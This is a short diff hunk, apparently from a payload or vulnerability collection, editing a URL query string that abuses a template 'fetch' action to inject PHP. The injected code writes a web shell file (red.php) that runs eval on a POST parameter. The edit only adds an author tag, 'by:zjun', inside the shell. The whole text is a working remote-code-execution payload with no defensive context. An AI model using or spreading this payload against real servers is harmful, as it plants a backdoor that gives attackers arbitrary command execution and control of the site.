@@ -21,7 +21,7 @@
 
 
 ```url
-?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','<?php eval($_POST["red"]);?>')</php>
+?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','by:zjun <?php eval($_POST["red"]);?>')</php>
 ```
 
 
